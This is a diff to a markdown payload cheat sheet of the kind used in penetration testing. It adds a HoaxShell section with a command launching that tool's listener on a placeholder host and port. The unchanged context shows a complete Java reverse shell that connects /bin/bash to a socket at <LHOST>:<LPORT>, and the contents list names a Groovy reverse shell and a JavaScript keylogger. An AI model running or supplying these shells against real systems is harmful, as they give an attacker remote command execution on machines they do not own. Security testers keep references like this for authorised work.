@@ -18,6 +18,7 @@
 - [GhostScript](#ghostscript)
 - [GIF](#gif)
 - [Groovy (Jenkins) Reverse Shell](#groovy-jenkins-reverse-shell)
+- [HoaxShell](#hoaxshell)
 - [iconv](#iconf)
 - [JAVA Reverse Shell](#java-reverse-shell)
 - [JavaScript Keylogger](#javascript-keylogger)
@@ -350,6 +351,14 @@ String host="<LHOST>";
 int port=<LPORT>;
 String cmd="/bin/bash";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
+## HoaxShell
+
+> https://github.com/t3l3machus/hoaxshell
+
+```c
+$ python3 hoaxshell.py -s <LHOST> -p <LPORT>
 ```
 
 ## iconv
